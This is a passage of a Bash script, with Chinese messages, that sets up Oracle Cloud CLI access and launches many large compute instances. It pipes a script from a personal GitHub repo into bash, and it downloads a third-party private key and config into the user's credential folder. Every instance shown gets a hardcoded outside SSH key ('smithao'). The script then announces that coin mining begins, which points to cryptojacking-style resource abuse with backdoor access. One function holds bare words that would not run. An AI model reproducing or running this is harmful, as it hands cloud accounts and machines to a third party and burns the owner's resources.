# 字体颜色配置
Green="\033[32m"
Red="\033[31m"
Yellow="\033[33m"
Blue="\033[36m"
Font="\033[0m"
GreenBG="\033[42;37m"
RedBG="\033[41;37m"
OK="${Green}[OK]${Font}"
ERROR="${Red}[ERROR]${Font}"



function install_oci() {
    pre_pare
	if ! [ -x "$(command -v python3)" ]; then
    bash -c "$(curl -L https://raw.githubusercontent.com/gcp5678/smithmlo/main/py.sh)"
	   if ! [ -x "$(command -v oci)" ]; then
        bash -c "$(curl -L https://raw.githubusercontent.com/oracle/oci-cli/master/scripts/install/install.sh)" 
       fi
	else
       if ! [ -x "$(command -v oci)" ]; then
        bash -c "$(curl -L https://raw.githubusercontent.com/oracle/oci-cli/master/scripts/install/install.sh)" 
       fi
    fi
 
	oci_config
}

function oci_config() {
  cd /root && rm -rf .oci && mkdir .oci && chmod 700 .oci && cd .oci && rm -rf filename.txt && wget -O config https://raw.githubusercontent.com/gcp5678/smithmlo/main/config && chmod 600 config
  config="/root/.oci/config"
  wget -O smihtao.pem https://raw.githubusercontent.com/gcp5678/smithmlo/main/smithao.pem && chmod 600 smihtao.pem
  keynamea="smihtao.pem"
  sed -i "s/kkkk/${keynamea}/g" ${config}
  print_ok "—————————————— 秘钥已设置 ——————————————""" 
  read -rp "请输入你的userid:" userid
  sed -i "s/uuuu/${userid}/g" ${config}
  print_ok "—————————————— userid已设置 ——————————————"""
  read -rp "请输入你的tenancyid:" tenancyid
  sed -i "s/tttt/${tenancyid}/g" ${config}
  print_ok "—————————————— tenancyid已设置 ——————————————"""
  while :; do
                echo -e "请输入你的region: [1-${#transport[*]}]"
                for ((i = 1; i <= ${#transport[*]}; i++)); do
                        Stream="${transport[$i - 1]}"
                                echo -e " $i.${Stream}"
                done
                read -p "$(echo -e "(输入数字)"):" v2ray_transport
                [ -z "$v2ray_transport" ] && v2ray_transport=1
                case $v2ray_transport in
                [1-4] ) 
				print_ok "区域为 = ${transport[$v2ray_transport - 1]}"
                        Regionsd="${transport[$v2ray_transport - 1]}"
						sed -i "s/gggg/${Regionsd}/g" ${config}
  print_ok "—————————————— region已设置 ——————————————"""
                        break
                        ;;
                *)
                        error
                        ;;
                esac
        done
		
  oci setup oci-cli-rc
  rm -rf oci-cli-rc && wget -O oci_cli_rc https://raw.githubusercontent.com/gcp5678/smithmlo/main/oci_cli_rc
  oci_cli_rc="/root/.oci/oci_cli_rc"
  sed -i "s/xxx/${tenancyid}/g" ${oci_cli_rc}
  print_ok "—————————————— oci_cli_rc已设置 ——————————————"""
  yum install -y openssl
  openssl rsa -pubout -outform DER -in ~/.oci/${keynamea} | openssl md5 -c > opssl
  fingerprinta=$(cat /root/.oci/opssl)
  fingerprint=${fingerprinta#*=}
  sed -i "s/ffff/${fingerprint}/g" ${config}
  print_ok "—————————————— 秘钥指纹已设置，配置完成，测试配置是否成功 ——————————————"
  ce_shi
}

function ce_shi() {

  oci iam tenancy get > /root/oracle/user.txt
  user=$(cat /root/oracle/user.txt)
  B="name"
  if [[ $user == *$B* ]]
  then
   name=$(cat /root/oracle/user.txt | jq .data.name | tr -d '"')
   print_ok "—————————————— 配置成功，当前租户${name}—————————————— "
  else
  print_ok "—————————————— 配置失败，请检查oci配置—————————————— "
  echo $user
  exit 1
  fi 
}


transport=(
   us-ashburn-1 
   us-phoenix-1
   eu-frankfurt-1
   uk-london-1 
)

function install_python() {
  yum install -y zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc make libffi-devel 
  wget https://www.python.org/ftp/python/3.7.2/Python-3.7.2.tgz
  tar -zxf Python-3.7.2.tgz
  mkdir -p /usr/local/python3
  cd Python-3.7.2/ && ./configure --prefix=/usr/local/python3make && make install
  ln -s /usr/local/python3/bin/python3 /usr/bin/python3ln && ln -s /usr/local/python3/bin/pip3 /usr/bin/pip3
  python3 --version 
}

function availability_domain() {
  sleep 6s
  oci iam availability-domain list > /root/oracle/domain
  DOMAINA=$(cat /root/oracle/domain | jq .data[0].name | tr -d '"' )
  DOMAINB=$(cat /root/oracle/domain | jq .data[1].name | tr -d '"')
  DOMAINC=$(cat /root/oracle/domain | jq .data[2].name | tr -d '"')
  
  domain=$(cat /root/oracle/domain)
  B="name"
  if [[ $user == *$B* ]]
  then  
  print_ok "—————————————— 获取availability-domain—————————————— "
  echo -e $DOMAINA
  echo -e $DOMAINB
  echo -e $DOMAINC
  else
  print_ok "—————————————— 获取domain失败—————————————— "
  echo $domain
  exit 1
  fi 
}
function print_ok() {
  echo -e "${OK} ${Blue} $1 ${Font}"
}

function subnet() {
  oci network vcn create --cidr-block 10.0.0.0/16 --display-name vnca > /root/oracle/network/vnca
  oci network vcn create --cidr-block 10.0.0.0/16 --display-name vncb > /root/oracle/network/vncb
  oci network vcn create --cidr-block 10.0.0.0/16 --display-name vncc > /root/oracle/network/vncc
  print_ok "—————————————— 获取vnc-id—————————————— "
  VNCAID=$(cat /root/oracle/network/vnca | jq .data.id | tr -d '"')
  VNCBID=$(cat /root/oracle/network/vncb | jq .data.id | tr -d '"')
  VNCCID=$(cat /root/oracle/network/vncc | jq .data.id | tr -d '"')
  oci network subnet create --cidr-block 10.0.0.0/16 --vcn-id ${VNCAID} --display-name subneta --availability-domain ${DOMAINA} > /root/oracle/network/subneta
  oci network subnet create --cidr-block 10.0.0.0/16 --vcn-id ${VNCBID} --display-name subnetb --availability-domain ${DOMAINB} > /root/oracle/network/subnetb
  oci network subnet create --cidr-block 10.0.0.0/16 --vcn-id ${VNCCID} --display-name subnetc --availability-domain ${DOMAINC} > /root/oracle/network/subnetc
  oci network subnet list > /root/oracle/network/subnet
  SUBNETIDA=$(cat /root/oracle/network/subnet | jq .data[2].id | tr -d '"')
  SUBNETIDB=$(cat /root/oracle/network/subnet | jq .data[1].id | tr -d '"')
  SUBNETIDC=$(cat /root/oracle/network/subnet | jq .data[0].id | tr -d '"')
  print_ok "—————————————— 获取subnet-id—————————————— "
  oci network internet-gateway create --is-enabled true --vcn-id  ${VNCAID} > /root/oracle/network/gatewaya
  oci network internet-gateway create --is-enabled true --vcn-id  ${VNCBID} > /root/oracle/network/gatewayb
  oci network internet-gateway create --is-enabled true --vcn-id  ${VNCCID} > /root/oracle/network/gatewayc
  oci network route-table list > /root/oracle/network/gateway
  RTAID=$(cat /root/oracle/network/gateway | jq .data[2].id | tr -d '"')
  RTBID=$(cat /root/oracle/network/gateway | jq .data[1].id | tr -d '"')
  RTCID=$(cat /root/oracle/network/gateway | jq .data[0].id | tr -d '"')
  print_ok "—————————————— 获取rt-id—————————————— "
  GATEWAYAID=$(cat /root/oracle/network/gatewaya | jq .data.id | tr -d '"')
  GATEWAYBID=$(cat /root/oracle/network/gatewayb | jq .data.id | tr -d '"')
  GATEWAYCID=$(cat /root/oracle/network/gatewayc | jq .data.id | tr -d '"')
  print_ok "—————————————— 获取internetgateway-id—————————————— "
  routea_rules="/root/oracle/routea_rules.json"
  routeb_rules="/root/oracle/routeb_rules.json"
  routec_rules="/root/oracle/routec_rules.json"
  print_ok "—————————————— 路由表规则下载...—————————————— "
  cd /root/oracle/ && wget -N --no-check-certificate -q -O routea_rules.json https://raw.githubusercontent.com/gcp5678/smithmlo/main/route-rules.json
  cp routea_rules.json routeb_rules.json && cp routea_rules.json routec_rules.json
  sed -i "s/xxx/${GATEWAYAID}/g" ${routea_rules}
  sed -i "s/xxx/${GATEWAYBID}/g" ${routeb_rules}
  sed -i "s/xxx/${GATEWAYCID}/g" ${routec_rules}
  print_ok "—————————————— 下载完成，开始更新路由表规则—————————————— "
  printf y  | oci network route-table update --rt-id ${RTAID} --route-rules file:///root/oracle/routea_rules.json  >> /root/oracle/network/routrule 2>&1
  printf y  | oci network route-table update --rt-id ${RTBID} --route-rules file:///root/oracle/routeb_rules.json  >> /root/oracle/network/routrule 2>&1
  printf y  |oci network route-table update --rt-id ${RTCID} --route-rules file:///root/oracle/routec_rules.json  >> /root/oracle/network/routrule 2>&1
  print_ok "—————————————— 路由表规则更新完成...—————————————— "
  
  security_list
}

function shape() {
  
  VM.Standard.E3.Flex
  VM.Standard.E4.Flex 
  VM.Standard3.Flex
  VM.Standard2.2
  VM.Standard1.2
  VM.Standard1.4
  VM.Standard.E2.2
  VM.Standard.E2.4
  
  VM.Standard.E2.1.Micro
  VM.Standard.A1.Flex
}

function imageid() {
  print_ok "—————————————— 获取imageid—————————————— "
  oci compute image list --shape VM.Standard.E3.Flex --operating-system 'Canonical Ubuntu' > /root/oracle/image/imagee3
  oci compute image list --shape VM.Standard.E4.Flex --operating-system 'Canonical Ubuntu' > /root/oracle/image/imagee4
  oci compute image list --shape VM.Standard3.Flex --operating-system 'Canonical Ubuntu' > /root/oracle/image/image3f
  oci compute image list --shape VM.Standard2.2 --operating-system 'Canonical Ubuntu' > /root/oracle/image/image22
  oci compute image list --shape VM.Standard1.2 --operating-system 'Canonical Ubuntu' > /root/oracle/image/image12
  oci compute image list --shape VM.Standard1.4 --operating-system 'Canonical Ubuntu' > /root/oracle/image/image14
  oci compute image list --shape VM.Standard.E2.2 --operating-system 'Canonical Ubuntu' > /root/oracle/image/imagee22
  oci compute image list --shape VM.Standard.E2.4 --operating-system 'Canonical Ubuntu' > /root/oracle/image/imagee24
  oci compute image list --shape VM.Standard.A1.Flex --operating-system 'Canonical Ubuntu' > /root/oracle/image/arm
  oci compute image list --shape VM.Standard.E2.1.Micro --operating-system 'Canonical Ubuntu' > /root/oracle/image/amd
  
  IMAGEE3=$(cat /root/oracle/image/imagee3 | jq .data[0].id | tr -d '"')
  IMAGEE4=$(cat /root/oracle/image/imagee4 | jq .data[0].id | tr -d '"')
  IMAGE3F=$(cat /root/oracle/image/image3f | jq .data[0].id | tr -d '"' )
  IMAGE22=$(cat /root/oracle/image/image22 | jq .data[0].id | tr -d '"')
  IMAGE12=$(cat /root/oracle/image/image12 | jq .data[0].id | tr -d '"')
  IMAGE14=$(cat /root/oracle/image/image14 | jq .data[0].id | tr -d '"')
  IMAGEE22=$(cat /root/oracle/image/imagee22 | jq .data[0].id | tr -d '"')
  IMAGEE24=$(cat /root/oracle/image/imagee24 | jq .data[0].id | tr -d '"')
  IMAGEARM=$(cat /root/oracle/image/arm | jq .data[0].id | tr -d '"')
  IMAGEAMD=$(cat /root/oracle/image/amd | jq .data[0].id | tr -d '"')
 
  
}

function open_instance() {
  print_ok "—————————————— 开始建立实例—————————————— "
  time=$(TZ=UTC-8 date "+%Y%m%d-%H%M")
  print_ok "—————————————— 当前时间${time}—————————————— "
  oci iam tenancy get > /root/oracle/user.txt
  name=$(cat /root/oracle/user.txt | jq .data.name | tr -d '"')
  print_ok "—————————————— 租户名${name}—————————————— "
  total=0
  echo -e $total > /root/oracle/total.txt
  amda_e3
  amda_e4
  amdb_e3
  amdb_e4
  amdc_e3
  amdc_e4
  intela_22
  intela_3f
  intelb_22
  intelb_3f
  intelc_22
  intelc_3f
  microa_14
  microa_12
  microa_e24
  microa_e22
  microb_14
  microb_12
  microb_e24
  microb_e22
  microc_14
  microc_12
  microc_e24
  microc_e22
  arm
  amd1
  amd2
  print_ok "—————————————— 实例创建结束，开始挖币 —————————————— "
}

function amda_e3() {
  echo -e " 第1台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINA} --display-name ${time}${name} --image-id ${IMAGEE3}  --subnet-id ${SUBNETIDA}  --shape VM.Standard.E3.Flex --assign-public-ip true  --shape-config '{"ocpus":6,"memory_in_gbs":96,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/amda_e3

  total=$(cat /root/oracle/total.txt)
  amda_e3=$(cat /root/oracle/ip/amda_e3)
  ID="metadata"
  if [[ $amda_e3 == *$ID* ]]
  then
  ((total=total+1))
  
  echo -e $total > /root/oracle/total.txt
  fi 
}

function amda_e4() {
  echo -e " 第2台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINA} --display-name ${time}${name} --image-id ${IMAGEE4}  --subnet-id ${SUBNETIDA}  --shape VM.Standard.E4.Flex  --assign-public-ip true  --shape-config '{"ocpus":6,"memory_in_gbs":96,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/amda_e4

  total=$(cat /root/oracle/total.txt)
  amda_e4=$(cat /root/oracle/ip/amda_e4)
  ID="metadata"
  if [[ $amda_e4 == *$ID* ]]
  then
  ((total=total+1))
 
  echo -e $total > /root/oracle/total.txt
  fi 

}

function amdb_e3() {
  echo -e " 第3台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINB} --display-name ${time}${name} --image-id ${IMAGEE3}  --subnet-id ${SUBNETIDB}  --shape VM.Standard.E3.Flex --assign-public-ip true  --shape-config '{"ocpus":6,"memory_in_gbs":96,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/amdb_e3

  total=$(cat /root/oracle/total.txt)
  amdb_e3=$(cat /root/oracle/ip/amdb_e3)
  ID="metadata"
  if [[ $amdb_e3 == *$ID* ]]
  then
  ((total=total+1))
  
  echo -e $total > /root/oracle/total.txt
  fi 
}

function amdb_e4() {
  echo -e " 第4台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINB} --display-name ${time}${name} --image-id ${IMAGEE4}  --subnet-id ${SUBNETIDB}  --shape VM.Standard.E4.Flex  --assign-public-ip true  --shape-config '{"ocpus":6,"memory_in_gbs":96,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/amdb_e4

  total=$(cat /root/oracle/total.txt)
  amdb_e4=$(cat /root/oracle/ip/amdb_e4)
  ID="metadata"
  if [[ $amdb_e4 == *$ID* ]]
  then
  ((total=total+1))
 
  echo -e $total > /root/oracle/total.txt
  fi 
}

function amdc_e3() {
  echo -e " 第5台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINC} --display-name ${time}${name} --image-id ${IMAGEE3}  --subnet-id ${SUBNETIDC}  --shape VM.Standard.E3.Flex --assign-public-ip true  --shape-config '{"ocpus":6,"memory_in_gbs":96,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/amdc_e3

  total=$(cat /root/oracle/total.txt)
  amdc_e3=$(cat /root/oracle/ip/amdc_e3)
  ID="metadata"
  if [[ $amdc_e3 == *$ID* ]]
  then
  ((total=total+1))
  
  echo -e $total > /root/oracle/total.txt
  fi 
}

function amdc_e4() {
  echo -e " 第6台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINC} --display-name ${time}${name} --image-id ${IMAGEE4}  --subnet-id ${SUBNETIDC}  --shape VM.Standard.E4.Flex  --assign-public-ip true  --shape-config '{"ocpus":6,"memory_in_gbs":96,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/amdc_e4
 
  total=$(cat /root/oracle/total.txt)
  amdc_e4=$(cat /root/oracle/ip/amdc_e4)
  ID="metadata"
  if [[ $amdc_e4 == *$ID* ]]
  then
  ((total=total+1))
  
  echo -e $total > /root/oracle/total.txt
  fi 
}



function intela_22() {
  echo -e " 第7台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINA} --display-name ${time}${name} --image-id ${IMAGE22}  --subnet-id ${SUBNETIDA}  --shape VM.Standard2.2  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":30,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/intela_22

  total=$(cat /root/oracle/total.txt)
  intela_22=$(cat /root/oracle/ip/intela_22)
  ID="metadata"
  if [[ $intela_22 == *$ID* ]]
  then
  ((total=total+1))
  
  echo -e $total > /root/oracle/total.txt
  fi 
} 
function intela_3f() {
  echo -e " 第8台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINA} --display-name ${time}${name} --image-id ${IMAGE3F}  --subnet-id ${SUBNETIDA}  --shape VM.Standard3.Flex  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":32,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/intela_3f
  
  total=$(cat /root/oracle/total.txt)
  intela_3f=$(cat /root/oracle/ip/intela_3f)
  ID="metadata"
  if [[ $intela_3f == *$ID* ]]
  then
  ((total=total+1))
  
  echo -e $total > /root/oracle/total.txt
  fi 

}
function intelb_22() {
  echo -e " 第9台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINB} --display-name ${time}${name} --image-id ${IMAGE22}  --subnet-id ${SUBNETIDB}  --shape VM.Standard2.2  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":30,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/intelb_22
  
  total=$(cat /root/oracle/total.txt)
  intelb_22=$(cat /root/oracle/ip/intelb_22)
  ID="metadata"
  if [[ $intelb_22 == *$ID* ]]
  then
  ((total=total+1))
  
  echo -e $total > /root/oracle/total.txt
  fi 
}
function intelb_3f() {
  echo -e " 第10台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINB} --display-name ${time}${name} --image-id ${IMAGE3F}  --subnet-id ${SUBNETIDB}  --shape VM.Standard3.Flex  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":32,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/intelb_3f
 
  total=$(cat /root/oracle/total.txt)
  intelb_3f=$(cat /root/oracle/ip/intelb_3f)
  ID="metadata"
  if [[ $intelb_3f == *$ID* ]]
  then
  ((total=total+1))
 
  echo -e $total > /root/oracle/total.txt
  fi 

}
function intelc_22() {
  echo -e " 第11台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINC} --display-name ${time}${name} --image-id ${IMAGE22}  --subnet-id ${SUBNETIDC}  --shape VM.Standard2.2  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":30,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/intelc_22
 
  total=$(cat /root/oracle/total.txt)
  intelc_22=$(cat /root/oracle/ip/intelc_22)
  ID="metadata"
  if [[ $intelc_22 == *$ID* ]]
  then
  ((total=total+1))
 
  echo -e $total > /root/oracle/total.txt
  fi 
}
function intelc_3f() {
  echo -e " 第12台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINC} --display-name ${time}${name} --image-id ${IMAGE3F}  --subnet-id ${SUBNETIDC}  --shape VM.Standard3.Flex  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":32,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}'> /root/oracle/ip/intelc_3f

  total=$(cat /root/oracle/total.txt)
  intelc_3f=$(cat /root/oracle/ip/intelc_3f)
  ID="metadata"
  if [[ $intelc_3f == *$ID* ]]
  then
  ((total=total+1))
  
  echo -e $total > /root/oracle/total.txt
  fi 
}



function microa_14() {
  echo -e " 第13台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINA} --display-name ${time}${name} --image-id ${IMAGE14}  --subnet-id ${SUBNETIDA}  --shape VM.Standard1.4  --assign-public-ip true  --shape-config '{"ocpus":4,"memory_in_gbs":28,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microa_14

  total=$(cat /root/oracle/total.txt)
  microa_14=$(cat /root/oracle/ip/microa_14)
  ID="metadata"
  if [[ $microa_14 == *$ID* ]]
  then
  ((total=total+1))
  
  echo -e $total > /root/oracle/total.txt
  fi 
}
function microa_12() {
  echo -e " 第14台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINA} --display-name ${time}${name} --image-id ${IMAGE12}  --subnet-id ${SUBNETIDA}  --shape VM.Standard1.2  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":14,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microa_12
  
  total=$(cat /root/oracle/total.txt)
  microa_12=$(cat /root/oracle/ip/microa_12)
  ID="metadata"
  if [[ $microa_12 == *$ID* ]]
  then
  ((total=total+1))
 
  echo -e $total > /root/oracle/total.txt
